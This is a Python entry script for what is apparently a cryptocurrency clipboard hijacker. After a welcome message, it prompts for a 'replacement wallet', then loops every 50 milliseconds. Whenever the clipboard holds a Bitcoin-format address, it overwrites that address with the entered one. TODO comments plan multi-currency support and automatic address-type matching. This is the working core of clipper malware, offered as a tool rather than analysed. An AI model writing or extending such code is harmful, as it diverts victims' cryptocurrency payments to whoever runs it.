from controller.clipboard_controller import ClipboardController
from controller.console_controller import ConsoleController
from view.console_view import ConsoleView
from time import sleep
#TODO ENTER_YOUR_CRYPTOS
#TODO GET FEEDBACK FROM MVC

ConsoleController().rich_traceback_handler()

if __name__ == "__main__":
    ConsoleView().show_welcome_message()
    ConsoleView().confirm_default_wallets_csv()
    # FIXME EVERYTHING BELOW ===========================================================================
    ConsoleView().print_clipboard_content()                                                         
    print("======================================================")                                 
    print("Clipboard was printed above for debug purposes! Will be removed in next versions.")      
    print("======================================================")                                 
    wallet_to_check = ConsoleView().rich_input('Please enter first replacement wallet:')            
    print(ClipboardController().check_wallet_format(wallet_to_check))                       
    print(ClipboardController().check_wallet_format(ClipboardController().clipboard_data()))
    while True:
        sleep(0.05)
        if ClipboardController().check_wallet_format(wallet_to_check) != None:
            if ClipboardController().check_wallet_format(ClipboardController().clipboard_data()) != None:
                ClipboardController().paste_new_data(wallet_to_check)
            else:
                print("Damn, it's not btc yet")
        else:
            exit()
            
    # FIXME EVERYTHING ABOVE ===========================================================================

    #TODO enter your address, leave blank if you don't want to use this one
    #TODO repeat step from above X times, depending on currency(-ies) you want to use
    #TODO automatically check what type of address user entered and inform him about his choice
    #TODO automatically replace address in clipboard using corresponding replacement address, if available
    #TODO if there are addresses for same currency but of different type - use first available

